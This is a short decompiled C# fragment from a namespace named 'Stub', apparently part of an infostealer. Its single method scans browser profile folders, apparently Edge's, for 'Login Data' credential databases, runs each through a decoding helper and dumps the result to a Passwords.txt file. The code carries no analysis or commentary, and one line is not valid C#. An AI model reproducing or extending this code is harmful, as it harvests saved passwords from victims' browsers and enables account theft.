using System;
using System.IO;

namespace Stub
{
	// Token: 0x02000005 RID: 5
	public sealed class Class1
	{
		// Token: 0x06000005 RID: 5 RVA: 0x000025D4 File Offset: 0x000007D4
		public static void smethod_0(string String_0)
		{
			string path = Class25.String_4 + Class25.String_2;
			if (!Directory.Exists(path))
			{
				return;
			}
			String_0 + "\\Edge";
			foreach (string str in Directory.GetDirectories(path))
			{
				if (File.Exists(str + "\\Login Data"))
				{
					Class14.smethod_7(Class21.smethod_0(str + "\\Login Data"), Class30.String_3 + "\\Passwords.txt");
				}
			}
		}
	}
}
